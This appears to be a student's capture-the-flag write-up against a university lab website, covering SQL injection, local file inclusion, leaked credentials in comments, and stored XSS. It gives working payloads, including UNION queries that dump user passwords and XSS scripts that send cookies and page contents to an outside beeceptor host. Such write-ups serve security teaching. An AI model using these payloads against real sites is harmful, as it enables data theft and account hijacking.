### SQLI on Search Page  Extreme

1. Visit the search page, input `' or 1=1 #'` outputs all results, which indicates it may have SQL injection.

2. Next, we need to find the number of columns. Since there are 4 columns displayed, we start testing from `'union select 1,2,3,4#`, which luckily gives the following result.

   <img src="img\2.1.png" alt="2.1" style="zoom: 67%;" />

3. Next, input `'union select 1,schema_name,3,4 from information_schema.schemata#` to retrieve all the schemas and the result is shown as follows. Now we know the names of all schemas which allow us to dive deeper.

   <img src="img\2.2.png" alt="2.2" style="zoom:67%;" />

4. Next, we can search the table names of different schemas. For example, input `'union select 1, table_name,3,4 from information_schema.tables where TABLE_SCHEMA='Secure'#` will give the following results, including a table named Flag which we should be interested to.

   <img src="img\2.3.png" alt="2.3" style="zoom:67%;" />

5. Next, we need to know the column names of the Flag table. Input `'union select 1,column_name,3,4 from information_schema.columns where table_name = "Flag" and table_schema="Secure"#` will provide us the result.

   <img src="img\2.4.png" alt="2.4" style="zoom:67%;" />

6. Finally, we can retrieve the string in Flag. Input `'union select 1,string,3,4 from Secure.Flag#` will give us the flag: `FLAG{Turning_them_tables_with_a_squiggle!@#1teeHee}`

<img src="img\flag2.png" alt="flag2" style="zoom:67%;" />

7. Input `'union select 1,column_name,3,4 from information_schema.columns where table_name = "Users" and table_schema="Secure"#`:

<img src="img\2.5.png" alt="2.5" style="zoom:67%;" />

8. Input `'union select Id,Password,Username,Website from Secure.Users#` provides:

<img src="img\2.6.png" alt="2.6" style="zoom:67%;" />



### LFI  High

1. `http://assignment-dusty-rose.unimelb.life/style.php?css_file=custom.css` is requested when the login page is visited, which indicates there may be LFI.

   <img src="img\1.1.png" alt="1.1" style="zoom: 80%;" />

2. Visit `http://assignment-dusty-rose.unimelb.life/style.php?css_file=php://filter/convert.base64-encode/resource=style.php` and decode the response to get the content of `style.php`. Though there is no flag in the file, we can know some of the website's defense mechanisms without authentication. Following is `style.php`: 

   ```php
   <?php
   
   if (isset($_GET["css_file"])){
   
       $file = $_GET["css_file"];
   
       if ($file[0] === "/"){
           die("Hacker detected");
       }
   
       $blacklist = array("/etc", "/usr", "/opt", "/dev", "/var", "/tmp", "auth", "search", "retrieve", "flag", "push", "pull", "../");
   
       foreach ($blacklist as $item){
           if (strpos($file, $item) !== false){
               die("Hacker detected");
           }
       }
   
       include($file);
       header("Content-Type: text/css");
   }
   ```

3. After authentication, we can have access to files such as `dashboard.php` and `login.php`. Visit `http://assignment-dusty-rose.unimelb.life/style.php?css_file=php://filter/convert.base64-encode/resource=dashboard.php` to get `dashboard.php`, we can find it requires other files including `sober.php`.

   <img src="img\1.2.png" alt="1.1"  />

4. Finally, visit `http://assignment-dusty-rose.unimelb.life/style.php?css_file=php://filter/convert.base64-encode/resource=sober.php` and we can get the flag: `FLAG{The_deepeR_YoU_Dig,_the_m0re_GOLD_you'll_find!}`

   <img src="img\flag1.png" alt="1.2"  />



### Information Disclosure  Medium

1. Recall that we have retrieved `dashboard.php` using LFI. Following are the lines of comments from #152 to #160:

   ```php
   // TODO: Fix up the background POST request. AJAX isn't working properly!
   /*
   var xhttp = new XMLHttpRequest();
   xhttp.open("POST", "retrieve.php", true);
   // add in headers: 
   // csrf => 8TdHvHDKu2368W474TTLgPcvWs8Q96aX
   // X-Auth => secure-auth
   xhttp.send("auth=@^?@NzcW+S3rSNDdQfwfdp@SD#M^Kx%5WMfxByWJS7@&HgFK-S&operation=fetch");
   /*
   ```

2. It seems developers have leaked some sensitive information here. We can try to make post requests to this address by modifying a post request as the following shows, which gives the flag:

   `FLAG{!!!ɘmoƨɘwɒ_ƨi_ϱniɿɘɘniϱnɘ_ɘƨɿɘvɘɿ}`

   <img src="img\flag4.png" alt="flag4"  />

   Note that the request must be authenticated, otherwise it will just return the login page.



### XSS in User Profile  High

1. There are some blocks allowing user inputs in the **User Profile** page, which may lead to XSS. Input `<script> alert(1) </script>` in these blocks to find a place for XSS. After pressing **PREVIEW PROFILE**, the **About Me** section is found to be a injection point.

2. Next, try to steal cookie using the following script:

   ```javascript
   <script>
   var x = new XMLHttpRequest();
   x.open("GET", "https://loop5.free.beeceptor.com/cookie?" + document.cookie);
   x.send();
   </script>
   ```

3. The cookie is sent to beeceptor as shown below:

   <img src="img\3.1.png" alt="3.1"  />

4. Since there is no flag contained, we need to seek other ways. Remember that in `style.php`, "flag" is in the blacklist. Visit `http://assignment-dusty-rose.unimelb.life/style.php?css_file=php://filter/convert.base64-encode/resource=flag.php` gives the following response, which indicates `flag.php` may exist.

   <img src="img\3.2.png" alt="3.2" style="zoom:67%;" />

5. Try to retrieve flag.php using AJAX call as the following script shows.

   ```javascript
   <script>
   var x = new XMLHttpRequest();
   x.onreadystatechange = function() {
       if (x.readyState === XMLHttpRequest.DONE) {
           var y = new XMLHttpRequest();
           y.open("GET", "https://loop5.free.beeceptor.com/flag=" + x.responseText);
           y.send();
       }
   };
   x.open("GET", "http://assignment-dusty-rose.unimelb.life/flag.php")
   x.send()
   </script>
   ```

6. Press `PUBLISH PROFILE FOR APPROVAL`, beeceptor gives `flag=Unauthorised!`. Look into the request header, the domain of referer is `http://localhost/` instead of `http://assignment-dusty-rose.unimelb.life/`.

   ```
   {
     "user-agent": "Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1",
     "accept": "*/*",
     "accept-encoding": "gzip, deflate",
     "accept-language": "en,*",
     "referer": "http://localhost/pull.php",
     "x-forwarded-for": "194.195.251.148",
     "x-forwarded-host": "loop5.free.beeceptor.com",
     "x-forwarded-proto": "https"
   }
   ```

7. Update the script and the flag is retrieved as below shows:

   `flag=FLAG{Mmm,_aren't_cookies_just_the_best!}`

   ```javascript
   <script>
   var x = new XMLHttpRequest();
   x.onreadystatechange = function() {
       if (x.readyState === XMLHttpRequest.DONE) {
           var y = new XMLHttpRequest();
           y.open("GET", "https://loop5.free.beeceptor.com/flag=" + x.responseText);
           y.send();
       }
   };
   x.open("GET", "http://localhost/flag.php")
   x.send()
   </script>
   ```

   <img src="img\flag3.png" alt="flag3"  />





